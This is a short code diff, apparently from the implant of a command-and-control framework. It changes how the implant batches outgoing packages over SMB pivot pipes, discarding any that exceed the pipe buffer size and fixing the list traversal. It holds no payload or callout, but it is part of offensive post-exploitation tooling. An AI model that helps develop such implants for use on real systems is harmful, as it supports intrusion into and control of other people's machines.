@@ -313,6 +313,7 @@ BOOL PackageTransmitAll(
     PPACKAGE Pkg     = Instance.Packages;
     PPACKAGE Entry   = NULL;
     PPACKAGE Prev    = NULL;
+    UINT32   NumPkgs = 0;
 
 #if TRANSPORT_SMB
     // SMB pivots don't need to send DEMON_COMMAND_GET_JOB
@@ -326,16 +327,50 @@ BOOL PackageTransmitAll(
     // add all the packages we want to send to the main package
     while ( Pkg )
     {
+#if TRANSPORT_SMB
+        // SMB pivots can't send packages greater than PIPE_BUFFER_MAX
+        if ( NumPkgs > 0 && Package->Length + Pkg->Length > PIPE_BUFFER_MAX )
+            break;
+
+        // if a single package is larger than PIPE_BUFFER_MAX, discard it
+        // TODO: support packet fragmentation
+        if ( Pkg->Length > PIPE_BUFFER_MAX )
+        {
+            // TODO: notify the oprator that a package was discarded
+            PRINTF( "The package 0x%p is longer than PIPE_BUFFER_MAX, discarding...\n", Pkg )
+
+            // remove package from chain
+            if ( Prev ) {
+                Prev->Next = Pkg->Next;
+            } else {
+                Instance.Packages = Pkg->Next;
+            }
+
+            Entry = Pkg->Next;
+
+            // free the package
+            if ( Pkg->Destroy ) {
+                PackageDestroy( Pkg );
+            }
+
+            Pkg = Entry;
+
+            continue;
+        }
+#endif
+
         PackageAddInt32( Package, Pkg->CommandID );
         PackageAddInt32( Package, Pkg->RequestID );
         PackageAddBytes( Package, Pkg->Buffer, Pkg->Length );
         Pkg->Included = TRUE;
+        NumPkgs += 1;
 
         // make sure we don't send a package larger than DEMON_MAX_REQUEST_LENGTH
         if ( Package->Length > DEMON_MAX_REQUEST_LENGTH )
             break;
 
-        Pkg = Pkg->Next;
+        Prev = Pkg;
+        Pkg  = Pkg->Next;
     }
 
     // writes package length to buffer
